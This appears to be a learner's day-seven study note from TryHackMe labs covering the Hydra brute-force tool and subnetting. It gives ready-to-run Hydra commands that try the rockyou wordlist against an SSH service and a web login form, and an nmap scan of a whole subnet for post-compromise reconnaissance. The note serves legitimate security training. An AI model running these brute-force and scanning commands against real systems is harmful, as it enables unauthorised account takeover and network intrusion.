# Day 7 — Hydra + Subnetting

## 📌 What I Learned
Hydra is a brute force tool that 
automatically tries millions of passwords.
Subnetting helps identify network ranges
and find all devices on a network.

---

## 🖥️ Hydra Commands

bash
# SSH brute force
hydra -l molly -P /usr/share/wordlists/rockyou.txt 
10.49.173.81 -t 16 ssh

# Web form brute force
hydra -l molly -P /usr/share/wordlists/rockyou.txt 
10.49.173.81 http-post-form 
"/login:username=^USER^&password=^PASS^:F=incorrect" 
-t 16 -V


---

## 🔑 Hydra Flag Breakdown

| Flag | Meaning |
|------|---------|
| -l | Single username to use |
| -P | Password list file |
| -t | Number of threads (parallel attempts) |
| -V | Verbose — show every attempt |
| -f | Stop after first successful find |
| ^USER^ | Replaced with username |
| ^PASS^ | Replaced with each password |

---

## 🌐 Subnetting Cheatsheet

| CIDR | Subnet Mask | Usable Hosts |
|------|-------------|--------------|
| /24 | 255.255.255.0 | 254 |
| /16 | 255.255.0.0 | 65,534 |
| /8 | 255.0.0.0 | 16,777,214 |

---

## 🔍 Internal Reconnaissance
After compromising one machine:
1. Find its IP — example: 192.168.1.100/24
2. Calculate network — 192.168.1.0/24
3. Scan all devices on network

bash
nmap -sV 192.168.1.0/24


Looking for: open ports, running services,
vulnerable software, other victims.

This is called *Internal Reconnaissance*.

---

## ⚠️ Important Note
All practice on TryHackMe authorized labs only.
